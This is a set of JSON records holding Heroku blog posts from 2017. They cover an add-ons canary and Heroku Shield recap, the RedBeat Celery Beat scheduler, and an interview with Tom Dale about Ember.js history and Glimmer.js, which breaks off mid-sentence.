{"website": "Heroku", "title": "FY18 Q1 recap: New Add-ons Canary & Heroku Shield Private Spaces GA", "author": ["Arif Gursel"], "link": "https://blog.heroku.com/fy18-q1-recap-new-add-ons-canary-heroku-shield-private-spaces-ga", "abstract": "FY18 Q1 recap: New Add-ons Canary & Heroku Shield Private Spaces GA Posted by Arif Gursel April 28, 2017 Listen to this article Need to quickly catch up on this past quarter's announcements? Here are the top three topics to tune in on: The new add-ons canary service will attempt to provision and deprovision your add-on service on an app named 'addons-canary'. These daily tests will help us proactively detect any failed provisioning attempts and ensure customers can provision all add-on services. This effort will also help us identify issues earlier and notify you of provisioning issues. Heroku Shield, a set of services included in Heroku Enterprise, is generally available and offers customers additional compliance features needed for building high-compliance applications. Heroku Shield includes Shield Private Spaces, Shield Private Dynos and Shield Private Postgres. Customers can add third-party add-ons to their Shield Private Space in the same way as a regular Private Space . The Private Spaces regions listed on an add-on's Elements listing indicate the regions that are supported for regular Private Spaces and Shield Private Spaces. Please verify that your add-on's manifest accurately reflect the supported Privates Spaces regions. addons partners partner portal Private Spaces Shield compliance", "date": "2017-04-28,"},
{"website": "Heroku", "title": "Hello RedBeat: A Celery Beat Scheduler", "author": ["Marc Sibson"], "link": "https://blog.heroku.com/redbeat-celery-beat-scheduler", "abstract": "Hello RedBeat: A Celery Beat Scheduler Posted by Marc Sibson May 02, 2017 Listen to this article The Heroku Connect team ran into problems with existing task scheduling libraries.  Because of that, we wrote RedBeat , a Celery Beat scheduler that stores scheduled tasks and runtime metadata in Redis.  We’ve also open sourced it so others can use it.  Here is the story of why and how we created RedBeat. Background Heroku Connect , makes heavy use of Celery to synchronize data between Salesforce and Heroku Postgres .  Over time, our usage has grown, and we came to rely more and more heavily on the Beat scheduler to trigger frequent periodic tasks.  For a while, everything was running smoothly, but as we grew cracks started to appear. Beat , the default Celery scheduler, began to behave erratically, with intermittent pauses (yellow in the chart below) and occasionally hanging (red in the chart below). Hangs would require manual intervention, which led to an increased pager burden. Out of the box, Beat uses a file-based persistent scheduler, which can be problematic in a cloud environment where you can’t guarantee Beat will restart with access to the same filesystem.  Of course, there are ways to solve this, but it requires introducing more moving parts to manage a distributed filesystem.  An immediate solution is to use your existing SQL database to store the schedule and django-celery , which we were using, allows you to do this easily. After digging into the code, we discovered the hangs were due to blocked transactions in the database and the long pauses were caused by periodic saving and reloading of the schedule.  We could mitigate this issue by increasing the time between saves, but this also increases the likelihood that we'd lose data.  In the end, it was evident that django-celery was a poor fit for this pattern of frequent schedule updates. We were already using Redis as our Celery broker, so we decided to investigate moving the schedule into Redis as well.  There is an existing celerybeatredis package, but it suffers from the same design issues as django-celery, requiring a pause and full reload to pick up changes. So we decided to create a new package, RedBeat, which takes advantage of the inherent strengths of Redis.  We’ve been running it in production for over a year and have not seen any recurrences of the problems we were having with the django-celery based scheduler. The RedBeat Difference How is RedBeat different?  The biggest change is that the active schedule is stored in Redis rather than within process space of the Celery Beat daemon. No longer does creating or modifying a task require Beat to pause and reload, we just update a key in Redis and Beat will pick up the change on the next tick. A nice side-effect of this is it’s trivial to make updates to the schedule from other languages.  As with django-celery, we no longer need to worry about sharing a file across multiple machines to preserve metadata about when tasks were last run.   Startup and shutdown times improved since we don't suffer from load spikes caused by having to save and reload the entire schedule from the database. Rather, we have a steady, predictable load on Redis. Finally, we added a simple lock that prevents multiple Beat daemons from running concurrently. This can sometimes be a problem for Heroku customers when they scale up from a single worker or during development. After converting to RedBeat, we’ve had no scheduler related incidents. Needless to say, so far we’ve been happy with RedBeat and hope others will find it useful too. Why not take it for a spin and let us know what you think? scheduler redis celery beat redbeat", "date": "2017-05-02,"},
{"website": "Heroku", "title": "The History of Ember.js: An Interview With Tom Dale at EmberConf - Part One  ", "author": ["Jonan Scheffler"], "link": "https://blog.heroku.com/history-of-emberjs", "abstract": "The History of Ember.js: An Interview With Tom Dale at EmberConf - Part One Posted by Jonan Scheffler May 09, 2017 Listen to this article At EmberConf Terence Lee and I had a chance to sit down with Tom Dale and chat about the history of Ember.js and where it’s headed now, including some details on the newly extracted Glimmer.js rendering engine. This post details a lot of the history of Ember, including some of the motivation that led the framework to what it is today. Watch the blog for the second portion of this interview with all of the details on Glimmer.js. The next post will also include the full audio of the interview, with many questions we opted to omit from the transcription to save valuable bytes. Jonan: So, we're at EmberConf speaking with Tom Dale, who gave a keynote today with some important announcements. We're going to dig into those in just a minute here, but I’d like you to introduce yourselves please. Tom: Sure. Hey, I'm Tom. I just started working at LinkedIn as a senior staff software engineer, and I work on a really awesome team that works on Ember infrastructure. As you may have seen, LinkedIn’s website now is one big Ember application. So my job is to make the army of engineers at LinkedIn productive, and make sure that we're able to build a really awesome web software. Terence: I'm Terence, I do language stuff and Rails on the languages team [at Heroku]. Jonan: There's a third-party Ember buildpack that you worked on, right? Terence: Yes. That has no JavaScript in it. Jonan: No JavaScript at all? But it ships Ember. I shipped my first Ember app on it. Tom: That's not true. Terence: It is true. Tom: It's all Ruby? Terence: Oh, yeah. Tom: Awesome. See that's great. You know what, Ember is a big tent, as DHH would say. Not about Ember, he would say that about Rails and then I would copy that because that's basically what we do.  We just take what DHH says, and we repeat them in the context of JavaScript, and it sounds very thought leadery. Jonan: Would you describe Ember as Omakase ? Tom: I would describe it as being bespoke, artisanal, shade-grown Omakase. Jonan: That's even better. So on the subject of Ember.It's been around for awhile now. How old is Ember? Five years plus? Tom: It depends on what date you want to use. So if you're talking about Ember 1.0, I think it's been about five years. Terence: Do you include SproutCore in that? Tom: I mean I think we should. There is no Ember without SproutCore, and to me SproutCore was one of the first libraries or frameworks to adopt this idea of client-side architecture. So one thing that we talked about in the keynote yesterday was just how much the web has changed in five years, right? So five years ago, IE was the dominant browser but actually, SproutCore had it way worse. And we're talking about IE6 and IE7 and talking about ambitious things, what we do on the web. Jonan: And you did it in an era where browsers were not even close to where they are today. Tom: Not even close, not even close. Jonan: That's interesting. So then, from SproutCore, Ember comes out five years ago and we're off to the races. A lot changed in that first year, you went 1.0 and you’ve said that there were a lot of things that went wrong along the way. In your talk, you had a slide where you mentioned a few of those things. From the 10,000-foot view, what kind of lessons did you learn in those first 5 years? Tom: JavaScript apps felt broken and people didn’t know why but people always said, \"JavaScript apps feel broken, you know, for whatever reason, please don’t use them\" right? And people wanted to shame you for using JavaScript. The reason for that, I think, is URLs. URLs are kind of the linchpin that holds the web together. And so much of the value of the web over native is these URLs, and JavaScript apps just ignored them. SproutCore ignored them, and almost every JavaScript framework did. So, what Ember had to do was figure out how to build JavaScript apps that don’t feel broken on the web. That’s where all this work with the router started. Nowadays, routers are taken for granted. Every framework, every library has a router that you can drop into it. But there was actually some novel computer science work that went into it, in how we tie the architecture of the app to the URL. That took a long time and it was a very organic process. I don’t think we fully understood the magnitude of the research project that was going on. There are a lot of examples of that where we tackled problems for the first time, so of course, there's gonna be kind of an organic exploration of that space. Another example of this is that when we adopted the six-week release cycle, this train model with Canary Beta and the release, the only other people doing it were Chrome and, I think, Firefox. And when we adopted it, it paid dividends right away, and I'm so happy that we adopted it. One constraint that we have that Chrome and Firefox don’t have as much is that for us, we're always shipping the framework over the wire every time a user visits your webpage, right? Jonan: Right. Tom: So it's very easy to have feature flags and to keep all the APIs around when you're distributing a binary. It's much harder when every time you do that, your file size goes up, and up, and up. And so what we've had to figure out is okay, \"Well, we really liked this release train model. People really like the fact that it's backwards compatible. People really don’t like ecosystem breaking changes like Python 2 to Python 3 or Angular 1 to Angular 2. That doesn’t work so what do we do?\" You know, you feel kind of stuck. So we've had to figure out a lot of things. Like one thing that we've been working on is something called Project Svelte, which is the ability to say, \"You can opt out of deprecated features and we will strip those from the build\". Jonan: But that's the only way that you can really move forward there. I mean if you've got to make this smaller, you can't just deprecate things arbitrarily. Tom: Right. Jonan: You can't make those decisions for your user. Your file size is ever growing, which when you're shipping over the wire, is not a great thing. This has already, historically, been an issue for Ember, the size of the framework. So what you are providing people now is a way to opt out of some those deprecated features. So say that, \"All right, I've stopped using this API in my codebase, we can strip this out.\" That's known as Project Svelte? Tom: Yeah, that's Project Svelte . It's really important to remember that when Ember started, there were no package managers. NPM wasn’t 1.0 or just hit 1.0, and was not at all designed for frontend packages. It didn’t do any kind of deduplication and distributing. This is back in the day when the way that you got a library was you Googled for the website, you found it, they gave you a script tag to just drop in. I'm sure you all agree that's a horrible way to do dependency management. So we felt compelled to say, \"Well, if we wanna make something… If we want people to actually use something, we have to bake it in.\" Because when you're gathering all your dependencies by hand, you're only gonna have, you know, four or five of them. You're not gonna go get a million dependencies. Of course, that has changed dramatically and we have new technology like Yarn , which is more like a Cargo/Bundler style of dependency resolution for JavaScript. What we found has not worked is trying to do big-design, upfront projects, because anything that we land in Ember gets that guarantee of stability and compatibility. People feel a very strong sense of responsibility, that if we land this feature, this has to be something that we are ready to support for the foreseeable future, and that just takes longer. It's the same reason standards bodies move relatively slowly. Jonan: Right. Now, this is something you brought up in your keynote. Rather than architecting or spending a huge amount of time and investment upfront architecting your system, you want to get it out in front of the customers as early as possible. But that conflicts with the idea that you're trying to present stable products, things that won't change, right? Terence: Stability without stagnation is the tagline right? Tom: Right. So that's the message but then we also know that you can't do a big design upfront, and you're not gonna get it perfect the first time. You ship an MVP and iterate. So how do you balance this tension? If you look at the projects we've embarked on in the last couple of years, there have been some projects that were more big design upfront. And those have largely stagnated and failed because of the fact that we just couldn’t get consensus on them. Then you have some other projects like Ember Engines and FastBoot. What we actually did was look at how web standards bodies work -- CC39, W3C, WHATWG. There's something called the \"Extensible Web Manifesto,\" which you may have seen, that says \"Hey, standard bodies, open source libraries are able to iterate a lot faster than you are. So instead of focusing on building these big, beautiful, really-easy-to-use declarative APIs, give us the smallest primitive needed to experiment on top of that.\" That’s something that we really take to heart in Ember 2. If you think of Ember as being this small stable core, what we can do is expose just the smallest primitive that you need, and then we can let the experimentation happen in the community. So with FastBoot, for example, FastBoot is this entire suite of tools for deploying server-side rendered, client-side apps. You can easily push it to Heroku and, boom, it starts running, but that doesn’t need to live in Ember. We can do all the HTTP stuff, all of the concurrency stuff. All of that can live outside of Ember, all Ember needs to say is, \"Give me a URL and I will give you the HTML for that back.\" So that's what we did. There's this API called Visit, the ‘visit’ method. You call it, you give the URL, you get HTML back, and it's so simple and you can easily have discussion about it. You can understand how it's gonna operate and that's the thing that we landed. Then that's given us a year to experiment in FastBoot and make a lot of really important changes. Jonan: You were able to hide the complexity away behind this simple API. Tom: Right. Jonan: So some of the things that more recently you mentioned in your keynote as not having gone well, were Ember Pods, for example, and now we have Module Unification. So if I understand correctly, Ember Pods was a way to keep all of your component files related to a single component in one location? Tom: Right. The Rails style where you have one directory that's all controllers and one directory that's all views or templates, which is how Ember started. It's still the standard way, the default way you get when you create a new Ember app. People found it more productive to say, \"I'm gonna have a feature directory\", where you have your component and that component might have style. It might have JavaScript, it might have templates. I think it's just easier for people to reason about those when they're all grouped together, instead of bouncing around. Jonan: I love this idea. When I first came into Rails, I distinctly remember going from file to file and thinking, \"Where even is this thing. How do I find this?\" So you had said that Ember Pods, maybe, didn’t seem to take off? It wasn't a very popular solution to that problem, and now we have Module Unifications. How is that different? Tom: I actually think that Pods was popular, it actually was very popular. So, there's something DHH says: \"Beginners and pro users should climb the mountain together.\" I think it's a bad sign, in your framework, if there's the documented happy path that beginners use, and then at some point, they fall off the cliff and see \"Oh, actually there's this pro API. It's a little bit harder to use but now that you're in the club, now you get to use it\". I think that leads to very bad experiences for both. You kind of wanna have both sets of people going up the same route. So Pods is almost this secret opt-in handshake. And it was just one of those things where it started off as an experiment but then slowly became adopted to the point where, I think, we didn’t move fast enough. Jonan: I see. Tom: We didn’t move fast enough and now, there's almost this bifurcation between apps that are not using Pods and apps that are using Pods. So with Module Unification what we did is we sat down and we said \"OK, Pods was a really nice improvement but it didn’t have a ton of design applied to it. It was the kind of thing that evolved organically. So let's just sit down and try to design something.\" For us, it was really important with Module Unification to say, \"Not only does it need to be good but we need to have a way of being able to automatically migrate 99% of the Ember apps today. We should have a command that will just migrate them to the new file system.\" So one thing that's really neat is that you can just have a component where all you have to do is drag it into another component's directory and now it's scoped. It's almost like a lexical scope in a programming language. We're using the file system to scope which components know about each other. Jonan: So, forgive my simplification here but I'm not great at Ember. If I have a login component and it's a box to just log in, and inside of it I wanted to have a Google auth button and a Twitter auth button, each of those could be independent components. Maybe I wanna reuse it somehow. I would drag them into my login directory and that makes them scoped, so we can't use them somewhere else. Tom: Right. That ends up being pretty nice because often, what you'll do is you'll create a new component, give it a really nice and appropriate semantic name and, oops, it turns out your coworker used that for another page, a year ago. Now, you can't use it, because it’s completely different. Jonan: So I've got my Ember app and I've been using Pods all this time, and now, we have Module Unification and there's a new way to do this. I can just move over to module unification right? Tom: Yes. Jonan: We run this script that you've written and it would migrate me over? Tom: Yeah. So we have a migrator and because there's so many Ember apps using the classic system, so many Ember apps using the Pod system, it can handle both. Terence: Could Module Unification have happened without Ember Pods happening first? Tom: It's hard to say. I think it's something that people really wanted, and I think it's fantastic. This is something we touched on the keynote; one thing that we've always said about Ember, and I think this is true about Rails also, is that there's always a period of experimentation when something new comes along. You really want that experimentation to happen in the community. Then eventually, it seems like one idea has won out in a lot of ways. The things that we learned about with Pods fed directly into Module Unification design. Jonan: So maybe, we could chat a little bit about deprecating controllers in Ember? Tom: Sure, yeah. Jonan: You announced that you were going to deprecate all of the top-level controllers by 2.0, and then pushed 2.1 and 2.2. That's still the plan to deprecate the controllers someday? Tom: I think what we are always dedicated to is trying to slim down the programming model and always reevaluate what is the experience like for new people. I don’t want to say that we're going to deprecate controllers because that sounds like a very scary thing, right? There's a lot of people with a lot of controllers in their apps. But I do think what we will want to do is take a look at the Ember programming model from the perspective of a new user. And say, \"Well, it seems like people already learned about components. And it seems like there's probably some overlap between what a controller does and what a component does.\" So maybe there's some way we can unify these concepts so people don’t have to learn about this controller thing with its own set of personality quirks. Jonan: Is this where routable components fit into the idea then? Tom: So that's the idea of routable components and I think I don’t have a concrete plan for exactly how this is going to work. I think a lot of ways, the work that we want to do on that was blocked by the Glimmer component API. I think what we'd like to do is add whatever low-level hooks in Ember are needed so that we can maybe do some experimentation around things like routable components outside. Let people get a feel for it and then once we have a design that we're really happy with, then we can land it back in mainland Ember. That’s the end of our discussion on the history and direction of the Ember project. Stay tuned for part two and learn more about the Glimmer.js project. ember javascript fastboot", "date": "2017-05-09,"},
{"website": "Heroku", "title": " The Future of Ember.js: An Interview With Tom Dale at EmberConf - Part Two", "author": ["Jonan Scheffler"], "link": "https://blog.heroku.com/future-of-emberjs", "abstract": "The Future of Ember.js: An Interview With Tom Dale at EmberConf - Part Two Posted by Jonan Scheffler May 11, 2017 Listen to this article This is the second of a two-part transcript from a recent interview with Tom Dale of Ember.js. In part one we discussed the history and direction of the Ember.js project . Continuing the discussion of the future for Ember.js, this post includes the rest of the interview, primarily focused on the Glimmer.js project. Some of the questions were omitted from these transcriptions for brevity, so we’re also releasing the nearly hour long audio file of the entire interview . Enjoy! Jonan: Let’s talk about Glimmer 2. If I understand correctly it's released now and it entirely supplants Ember. So how are you planning to gracefully sunset the project? Terence: I think locks (Ricardo Mendes) talked about how people already have five years of Ember experience, they can now move on to this Glimmer thing, right? Tom: That's right, yeah. You can put five years of Glimmer experience on your resume, on your LinkedIn profile. You know, something we really wanted to be mindful of is that it's really easy to think that we're giving up on Ember or that we just, declared bankruptcy and we’re starting over again fresh. Because actually, this is what happens in the JavaScript community all the time, right? New version, backwards incompatible, we decided that it was just too clunky to ever fix. Terence: Right. Angular 1 and Angular 2 thing? Tom: Something like that, right? Jonan: And in some cases, that's the right choice. Terence: Yeah, I think it is. Jonan: In the first version, there were mistakes made, let's move on. There is no right choice in those circumstances. Maybe it's the only choice that you have. Tom: Right. So Glimmer is a little bit different. The first thing to understand is that Glimmer is an extraction, it's not a brand-new library. One piece of feedback that we get all the time is people say, \"You know, I would, theoretically, be interested in using Ember but I don’t need all of that stuff. I don’t need a router, I don’t need a data layer. I just want components. I have a Rails app and I just wanna do some kind of interactive widget.\" People use JQuery, they use React, things that are really easy to drop in, super simple to learn. So, we thought about it and said, \"Well, you know, we actually have this awesome rendering library in this engine called Glimmer. Why don’t we make it available to people who don’t wanna buy into Ember?\" You know it shouldn’t be an all-or-nothing thing. We should try to think about how we can bring incremental value to people. So that's one. It's not a new project. It's an extraction. The other thing is that I don’t think about Glimmer as being a different project. I think about Glimmer as being a way for us to experiment with the future of the component API in Ember. So one thing that we're working on right now, and actually there is an RFC written by Godfrey Chan, is an API that lets people write plug-ins that implement different component APIs. Remember, LinkedIn is an Ember app. It’s an Ember app that has had a lot of money and a lot of work put into it, and I promise you, we're not just gonna throw that away and rewrite it in Glimmer. So we really need to focus on the experience of taking Glimmer components and bringing them into an Ember app; that's what we're working on right now. Glimmer components, I think of it as the future of the Ember component API. What I would really love is that people can start working on Glimmer applications, see that it has this beautiful UI, it's fast, it's slick, all these things. Then they realize, \"Hey, actually, maybe I need Ember data, maybe I need a router?\" And then what they'll do is just take these Glimmer components, drag and drop them into their Ember app and, boom, they just work without having to change a line of code. Jonan: Ember includes a lot of things. It's prepared to handle problems that you can't foresee yet which is one of the benefits of using a framework. But that means that it's larger than maybe you need in the moment. So I could start with a very small Glimmer app, and Glimmer itself is small, right? Tom: Yeah, it's really small. Jonan: So the advantage right now though, because we don’t have that component transferability, we can't just take an Ember component and take it into Glimmer today, is that it’s small. You described it as useful for a mobile application. The example you gave in the keynote was a temperature widget that gave the temperature in various cities. Give us like a real-world use case of Glimmer. Tom: Sure. I mean I can give you a very real-world use case, which is that before I joined LinkedIn, I was working at this really awesome little startup in New York called Monograph. One of the things Monograph was doing was building these e-commerce apps that were designed to integrate into social media apps. So one thing that's really amazing about the web that you can't do on native, is you can actually run inside of other apps. You can run inside of Facebook, you can run inside of Twitter, you can run inside of any social media app and that's something that native apps can't do. What we wanted to do was build this experience that felt very native but it also had to load really, really fast. Because you didn’t get to load it until a user tapped the link. So we actually tried to build a few prototypes in Ember and they actually worked really great on the iPhone, but then we had some investors in Australia on Android phones, and when they tapped on it, it took like 10 seconds to load. That's just not acceptable when you're trying to target these mobile apps. I said \"We have this great entry engine in Ember and it's really small. I wonder if I can hack together something using this?\" And the reality was that if we couldn’t, I was gonna have to use something like React or something. So I told my boss \"Give me a week. Give me a week to see if I can do it in Glimmer. I have this crazy idea, let's see if we can do it.\", and we actually pulled it off. We've run a few campaigns now and things have sold out in like an hour. So the model works. I think if you're building an app that needs a router and uses a data layer, yeah, you should be absolutely using Ember. This is definitely a pared down experience, but my hope is that we're gonna figure out ways of taking these big apps and kind of slicing them up in a way that will be good for mobile. Jonan: I just want to make sure I’ve got the technical details right here. Ember rendered JavaScript in the past, and now it is rendering bytecode: a series of opcodes that are interpreted on the client side by a couple of different VMs. You have an update VM and you have a render VM. So the first time that you load up a page, you're gonna send over some bytecode and that's gonna be interpreted by this TypeScript VM, the render VM, and then the updates will come into the update VM in the next round? Okay. And so the actual content of this bytecode, what is that? Tom: It's a JSON object. The reason for that is, of course, JSON is a much smaller subset of the JavaScript language. So they're more compact and they're much faster to parse. Modern JavaScript VMs are very fast and very good at doing just-in-time compilation to native code. So if we emit JavaScript, those will get compiled into these really fast operations. The problem that we didn’t realize at the time was that when you have apps that grow, that is a lot of JavaScript, and all that JavaScript gets parsed eagerly. Now you are in the situation where you're spending all this time parsing JavaScript. For some parts of that page, it doesn’t need to get parsed because it never gets rendered. Jonan: So in the olden days, again, I need to simplify this for my own thinking here. I have a page with a home and an about page, right? Tom: Mm-hmm. Jonan: And I don’t ever click on the about tab. But that JavaScript is still there. Tom: It's still loaded. Jonan: And it's still interpreted. Tom: Still parsed, right. Jonan: And it's not necessary, right? Tom: Right. Jonan: So now, in this new world, the JSON blob that represents that about page, if the user never clicks on that link, it never actually has to get turned into anything. Tom: Right. We keep it in memory, resident in memory as a string, and we just-in-time JSON parse it. And of course, the JSON parsing is gonna be faster than the JavaScript parsing because of the fact that it's so restricted. Jonan: I see. And so then, you can take that JSON and turn directly into the page that you need. There's no other step there? Tom: Right. Jonan: I see, okay. Tom: So one of the advantages of Handlebars, you know, there's kind of this raging debate about if you should use templates like Ember, and Glimmer, and View, JSDO or should you use JSX like React and all of the stuff React likes. One of the really nice things about Handlebars is that it's very statically analyzable. We can very easily analyze your template and say, \"Okay, these are the components you're using. These are the helpers that you're using. This is the structure.\" That lets us do more work when you deploy, when you build and that means less work on each user's browser. Jonan: Right, but then also, as you talked about in your keynote, maybe it comes at the expense of file size in some cases which is another problem that Glimmer solves. Because what you're sending over the wire is actually much smaller now. Tom: Right. So that was the other downside of doing the compilation with the JavaScript and that’s just the representation. I mean think about JavaScript as a syntax you have, you have functions, and you have var, and you have all of these different things. By creating our JSON structure, we can get that down. Jonan: So, we've been talking about progressive web apps a lot this year, and there are a lot of things that have happened recently that enabled progressive web apps to actually be a thing. We can now say reliably that you can present an offline experience that is close to the real experience with the possible exception of mobile Safari. I've heard that that's a popular browser. Tom: It is. Jonan: Something like 55% of the U.S. market is using an iPhone. Tom: That's right. Jonan: So they don’t have service workers that's the problem here, right? I wanna just explain real quick. A service worker, for my own thinking, is this thread that I can run in the background, and I can schedule tasks on it. So it doesn’t even mean you have to have my page open, right? Tom: Right. Jonan: I can go and refresh the data that I'm caching locally. Tom: The most important thing about the service worker, from my perspective, the thing that it unlocked in terms of taking something that usually only the browser can do, is now giving me, as a JavaScript programmer, access to intercepting network requests. Not just JavaScript but literally, I can have a service worker and if I put an image tag on my page and my service worker is consulted saying, \"Hey, we're about to go fetch this image. Would you like to give me a version from cache?\" That is hugely powerful when you're talking about building an offline experience. Because now you have programmatic access to the browser cache, to the way it looks at resources. So now, you have this very powerful abstraction for building whatever caching you want offline. Jonan: So whatever possible request could be coming from your application is more or less proxied through this server? Tom: Exactly. So in addition to their request, you also have access to browser cache. So you can put things in, you can take things out. That's what lets you program very specific rules. Because you don’t always wanna say use from the cache, right? Sometimes, there are things that you actually want like how many items in inventory remain, right? You probably don’t want that cached. You probably wanna have the most updated information possible. Jonan: We don’t have service workers in Safari and we won't for the foreseeable future. Tom: Well, we don’t have it in Safari but we have it in Firefox and we have it in Chrome. You know, the P in PWA, it stands for Progressive Web App, so you can progressively add this to your application. You know I think the best way to get features into a browser is to adopt them and say \"Hey, if you're using an Android phone, you have this really awesome experience. But if you have an iPhone, you know, maybe it's not as awesome.\" Apple, I truly believe, really cares about the user experience. If there's one thing I've got from the Safari team is that they always prioritize making a feature fast and not draining the user's battery over being able to check a check mark. So I actually have a lot of respect for their position, and I think if they do service workers, they're going to do it right. If they see that people are having a better user experience on an Android phone than an iPhone that is hugely motivating for them. Terence: Does the service worker impact the batteries on phones? Tom: It could, it could, yeah. I think what browser vendors are going to have to figure out is what is the right heuristic for making sure that we can run a service worker, but only in service of the user, pardon the pun. How do we make sure that people aren't using it maliciously? How do I make sure this website is not mining bitcoin on your phone and now your battery life is two hours, you know? Jonan: Sure, yeah. Tom: It's a really tricky problem. Jonan: Even if they're relatively innocuous. They don’t necessarily need to be malicious. If you've got a hundred of them and they're all just trying to fetch the same image online, this will dramatically impact your phone's performance. Tom: Yeah, absolutely. Or if you think about, you know, you install a native app and all of a sudden, you start getting push notifications, that's not great for your battery life either. Terence: I guess, you talked about progressive web apps in last year’s keynote, what has the uptake been since then? I know it was kind of a work in progress kind of thing, and we just saw two talks yesterday related to progressive web apps. Tom: Yup. Terence: So has the adoption been pretty strong within the community? Tom: Yeah, absolutely. I think people are really excited about it. I think there are so many aspects to progressive web apps, and I think the definition isn't clear exactly. It's one of these terms that people talk about. Sometimes, it becomes more of a buzzword than a very concrete thing. There are a lot of things that you can do on the path to a progressive web app. So service worker, as Jonan said, is the one thing that people think about the most, but there are also things like server-side rendering, to make sure that the first few bytes that you sent to the user are in service of getting content in front of them. Not just loading your dependency injection library. Jonan: Right. Tom: You really wanna get the content first. There's the ability to run offline, there's the ability to add to the home screen as a first-class icon, the ability to do push notifications. Jonan: Removing the browser chrome, making it feel like a native app experience. Tom: Yup, and actually, Android has done some really awesome work here to make a progressive web integrate into the operating system such that as a user you can't really tell. That’s the dream. Jonan: Yeah, of course. Tom: The community uptake has been phenomenal, and this is exactly one of those things where it's gonna require experimentation. This is a brand new thing. People don’t know the optimal way to use it yet and that experimentation is happening. There are a ton of Ember add-ons: there are service worker add-ons, there are add-ons for adding an app manifest so you get the icon. All sorts of cool stuff. I think what we should start thinking about is, \"Okay, well what is the mature part of this that we can start baking into the default experience when we make a new Ember app, such that you get a PWA for free?\", and I would guess that we are probably on the way there, sometime this year or early next year. Saying that \"You just get this really awesome PWA out of the box when you make a new Ember app.\" Jonan: That will be fantastic. I would like that very much. Tom: Defaults are important. I think if you care about the web, especially the mobile web being fast, the highest impact thing you can do is find out what developers are doing today and make the default the right thing. Terence: So do you imagine in the next couple years, PWA and FastBoot are just going to be baked into new Ember apps? Tom: I certainly hope so. I don’t think we want to do it before it's ready. FastBoot, in particular of course, introduces a server-side dependency. One thing that people really like about client side apps is that I don’t need to run my own server, I can just upload to some kind of CDN. That's nice, I don’t like doing ops. That's why I use Heroku so I don’t have to think about ops. So that's the hard thing about server-side rendering, it does introduce computation requirements when you deploy. So I don’t know if FastBoot will ever be the default per se, but I do know that I want to make it really easy and at least give people the option. \"Hey, server-side rendering is really important for many kinds of apps. Do you wanna turn it on?\" The PWA stuff, I think we can do it within the existing parameters of being able to do static deploys, so yeah, let's do it. Terence: If you have FastBoot on the app it’s totally optional though right? Tom: Yes, totally optional. Terence: You can still deploy the assets and ignore FastBoot completely, even if it was part of the standard app, right? Tom: That's true. Yeah, that's true, and really that, I think, is the beauty of client-side architecture plus server-side rendering. \"Oh, my server is over capacity.\" Well, you can just have your load balancer fall back to the static site, and maybe the user doesn’t get the first view as fast but they still get the full experience. So much of what FastBoot is, is this conventional way of having not just the server-side rendering but also having a good user experience around it. So much of that relies on the good bits of Ember, the very conventional structure. So I think Glimmer will rapidly support server-side rendering but massaging that into an easy-to-use thing is, I think, an Ember responsibility. Jonan: The VMs that we're talking about, with the Glimmer on the frontend, the updated render VMs, are written in TypeScript. Tom: That's right. Jonan: You mentioned during your keynote that there were some features you added to TypeScript 2.2, or worked with the TypeScript team to add to TypeScript 2.2. and 2.3, to enable Glimmer? Is that me misunderstanding something? Tom: It's not enabling Glimmer per se, because Glimmer 2 from the beginning has been written in TypeScript. I think when they started TypeScript was on 1.8, so when you make a new Glimmer app, the default is to get TypeScript. That just works out of the box, because the library is written in TypeScript you get awesome code completion, you get intellisense, you get documentation in line, all these things automatically. I can't say enough positive things about the TypeScript team. They are so professional, they are so responsive. We even asked Daniel Rosenwasser, who is the PM, last week \"Hey do you wanna come to EmberConf next week?\" \"I will come, because I really want to meet the Ember community.\" They're really, really wonderful. So for Glimmer, the internals, because it's written in Typescript, there were really no problems. But the thing that they realized is, \"Hey, there's actually this long tail of libraries that come from earlier versions of JavaScript like when ES3 and ES5 were kind of cutting edge, that built their own object model on top of JavaScript.\" So if you look at Ember for, example, you have the Ember objects model where you have .get and .set, and you have ember.object.extend and ember.object.create. Before we had ES6 classes, we had no choice but to build our own on top of the language. The problem is we need some way to let TypeScript know, \"Hey, when we call ember.object.extend, that's not some random method, that's actually defining a type. That's defining a class.\" The TypeScript team has been really awesome saying, \"Okay, how do we rationalize that and add the extension points where a system like Ember or…\" I mean here's the thing. Every JavaScript library from that era has their own system like this, so they've built these really awesome primitives in TypeScript that let you express key types or mapped types. \"Hey, when you see ember.object.extend, we're gonna pass it to POJO, Plain Old JavaScript Object as an argument. That's not just a bag of data. I want you to actually look at the keys inside of that object and treat those like types.\" So that's the thing we're really excited about because, of course, you're going to be writing Glimmer apps, you're going to be writing Glimmer components. You're going to get these really nice TypeScript features but then we don’t want you to have to go back to Ember code and miss those benefits. Jonan: That's a fantastic feature to have in a language and it's a difficult thing to bring yourself to add, I would imagine, if you're maintaining something like TypeScript. I think this is a smart way to approach the problem. Tom: Yes. Jonan: But you're looking at all of these people with their own legacy object models and I have an object model now, and I want people to use the object model that exists in this language. Right? Tom: Exactly, yes. Jonan: How do I let you also just roll your own object model? It's a pretty fundamental part of a programming language. Tom: It is, yeah, and that' what I mean about professionalism. I really, really appreciate the TypeScript team thinking so carefully about adoption, because I think it really requires maturity to do that. How do we bridge the gap, reach people where they are today? And then we can slowly bring them into the new, modern world as they do new things. I think that's hugely important and I think it's one thing that many people in the JavaScript community undervalue. It is such a breath of fresh air to see it from Typescript. Jonan: That's great. Terence: Yeah. It seems to align a lot with all the stuff Ember tries to do with the way it does it features. Jonan: So at the very end of the keynote… You ran a little long on the keynote which is a rare thing to see. Tom: Yeah, yeah, very rare. Jonan: This year, you were overtime a little bit and you flipped through some content very quickly at the end. I was hoping maybe you could give us a peek at some of those things you didn’t get time to talk about in your keynote, that you wish you had time to mention. Tom: I think if we had had more time, one thing I would have really loved to go into more was the Glimmer API. I see the Glimmer API for components being the future of how you do components in Ember, and we have focused really hard on making these things feel like it's just regular JavaScript. Like I was saying, when Ember came of age, we didn’t have the ES6 classes. We couldn't even use ES5 because it wasn't adopted enough. So we built our own object model on top. Then rapidly, all of a sudden, the pace of JavaScript's development picked up, and now we have classes, and we have decorators, and we have getters, and we have all these amazing new things. Because it happened right after we stabilized our API, people look at Ember sometimes and think, you know, that feels like they're doing their own weird thing and already know JavaScript. It's like \"I don’t wanna do it the Ember way. I wanna do it the JavaScript way.\" So what we tried really, really hard to do with Glimmer is say, \"Okay, let's think about what someone who only knows JavaScript or modern JavaScript, what do they know and what are they expecting?\" And let's just make the whole thing feel easy and natural for them. So for example, Glimmer component when you define it is just an ES6 class that extends the Glimmer component base class. The way that you import the Glimmer component is a standard import. Then there's a proposal in JavaScript called \"decorators,\" which I believe is stage two. That lets you add certain annotations to properties, and 